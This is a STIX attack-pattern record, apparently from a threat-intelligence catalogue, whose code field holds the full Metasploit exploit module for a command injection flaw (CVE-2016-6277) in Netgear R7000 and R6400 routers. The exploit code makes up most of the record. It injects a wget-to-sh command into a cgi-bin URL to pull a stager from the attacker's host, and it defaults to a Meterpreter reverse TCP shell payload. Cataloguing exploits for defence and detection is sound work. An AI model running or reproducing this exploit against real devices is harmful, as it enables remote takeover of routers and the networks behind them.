{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--624ce240-a938-447b-b6ac-f1dafdc17da9",
    "created": "2024-08-14T17:03:47.687477Z",
    "modified": "2024-08-14T17:03:47.687481Z",
    "name": "\"Netgear R7000 and R6400 cgi-bin Command Injection\"",
    "description": " This module exploits an arbitrary command injection vulnerability in Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.  'License'              => MSF_LICENSE 'Platform'             => 'linux'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_r7000_cgibin_exec.rb",
            "external_id": "netgear_r7000_cgibin_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305"
        },
        {
            "source_name": "reference",
            "url": "http://kb.netgear.com/000036386/CVE-2016-582384"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6277"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                 => \"Netgear R7000 and R6400 cgi-bin Command Injection\",\n      'Description'          => %q{\n        This module exploits an arbitrary command injection vulnerability in\n        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.\n      },\n      'License'              => MSF_LICENSE,\n      'Platform'             => 'linux',\n      'Author'               => ['thecarterb', 'Acew0rm'],\n      'DefaultTarget'        => 0,\n      'Privileged'           => true,\n      'Arch'                 => ARCH_ARMLE,\n      'Targets'              => [\n        [ 'Automatic Target', { } ]\n      ],\n      'References'           =>\n        [\n          [ 'EDB', '40889'],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],\n          [ 'US-CERT-VU', '582384'],\n          [ 'URL', 'http://kb.netgear.com/000036386/CVE-2016-582384'],\n          [ 'CVE', '2016-6277']\n        ],\n      'DisclosureDate' => '2016-12-06',\n      'DefaultOptions'  =>\n        {\n          'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'\n        }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n\n    deregister_options('URIPATH')\n  end\n\n  def scrape(text, start_trig, end_trig)\n    text[/#{start_trig}(.*?)#{end_trig}/m, 1]\n  end\n\n  # Requests the login page which discloses the hardware, if it's an R7000 or R6400, return Detected\n  def check\n    res = send_request_cgi({'uri'=>'/'})\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Connection timed out.')\n    end\n     # Checks for the `WWW-Authenticate` header in the response\n    if res.headers[\"WWW-Authenticate\"]\n      data = res.to_s\n      marker_one = \"Basic realm=\\\"NETGEAR \"\n      marker_two = \"\\\"\"\n      model = scrape(data, marker_one, marker_two)\n      vprint_status(\"Router is a NETGEAR router (#{model})\")\n      if model == 'R7000' || model == 'R6400'\n        print_good(\"Router may be vulnerable (NETGEAR #{model})\")\n        return CheckCode::Detected\n      else\n        return CheckCode::Safe\n      end\n    else\n      print_error('Router is not a NETGEAR router')\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n    return if check == CheckCode::Safe\n\n    @cmdstager = generate_cmdstager(flavor: :wget, 'Path' => '/').join(';')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => \"/cgi-bin/;wget$IFS-O-$IFS'#{srvhost_addr}:#{srvport}'|sh\"\n    )\n  end\n\n  # Return CmdStager on first request, payload on second\n  def on_request_uri(cli, request)\n    if @cmdstager\n      send_response(cli, @cmdstager)\n      @cmdstager = nil\n    else\n      super\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-06"
}